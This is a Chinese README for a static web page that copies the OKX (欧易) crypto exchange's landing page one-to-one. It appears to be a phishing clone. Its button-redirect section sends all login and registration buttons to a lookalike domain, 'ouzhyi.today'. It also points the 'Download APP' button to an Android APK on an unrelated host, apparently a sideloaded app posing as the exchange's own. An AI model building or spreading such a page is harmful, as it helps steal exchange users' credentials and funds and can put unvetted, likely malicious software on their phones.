# OKX 风格单页（本地视频版）

本项目用于将提供的 Figma 首屏与页面结构 1:1 还原为前端静态页面（HTML5 + CSS + 原生 JS），并在指定区域嵌入本地视频与图标。

## 目录结构

- `index.html` 页面入口
- `styles.css` 页面样式
- `script.js` 交互脚本（FAQ 折叠、轻微动画等）

可选（如遇到浏览器屏蔽 `file://` 访问）：
- `assets/` 建议将本地视频与图标复制到该目录后，改用相对路径引用

## 页面说明

- 顶部导航：左侧使用提供的欧易图标；右侧包含“登录”“注册”“下载APP”。
- 首屏（Hero）：左侧品牌标题与按钮，右侧展示手机框中的第一段视频。
- 交易终端展示：大幅横向容器内播放第二段视频。
- 助手/卖点区：文案与第三段视频（轻量展示）。
- 常见问题（FAQ）：点击折叠/展开。
- 页脚：多列导航与品牌区域。

## 视频与图标路径（按从上到下顺序）

1. `file:///F:/EASYMONEY/OKX/Sources/6E1508940A1C6CCD.mp4`
2. `file:///F:/EASYMONEY/OKX/Sources/CB440B7DC62FD604.mp4`
3. `file:///F:/EASYMONEY/OKX/Sources/D47D930F643E7A00.webm`
4. 图标：`file:///F:/EASYMONEY/OKX/Sources/图标.png`

> 说明：
> - 若直接双击 `index.html` 以本地方式打开（`file://` 协议），上述绝对路径可正常访问。
> - 若通过本地服务器（`http://`）访问，浏览器会阻止跨源读取 `file://`，此时请将 3 段视频与图标复制到项目 `assets/` 目录，并在 `index.html` 中把 `src` 改为相对路径（例如 `assets/xxx.mp4`）。

## 按钮跳转

- 所有“登录/注册/立即体验”等注册相关按钮：跳转到
  `https://www.ouzhyi.today/zh-hans/account/register`
- 顶部“下载APP”按钮：跳转到
  `https://download.nodewebb.com/upgradeapp/android_ACE528334.apk`

## 使用方式

1. 直接双击打开 `index.html`（推荐在 Windows 下使用 Chrome）。
2. 若需本地服务器，使用任意静态服务器（如 VSCode Live Server）启动。但请注意 `file://` 路径受限问题，必要时将资源复制到 `assets/` 并改为相对路径。

## 技术要点

- 仅使用 HTML5 + CSS + 原生 JavaScript，语义化结构，响应式布局（Flex 与 Grid）。
- 所有结构与样式均包含中文注释，便于非技术用户理解与二次修改。
- 遵循现代浏览器最佳实践：视频 `autoplay` + `muted` + `playsinline`，避免自动播放被拦截。

## 后续优化建议

- 图片与 CSS 压缩，使用现代图片格式（WebP/AVIF）。
- 将字体与图标打包为本地资源，减少外部依赖。
- 引入懒加载（`loading="lazy"`、`IntersectionObserver`）延迟加载非首屏媒体。
- 如需更强交互体验，可逐步接入轻量动画库，但保持无框架依赖以降低复杂度。
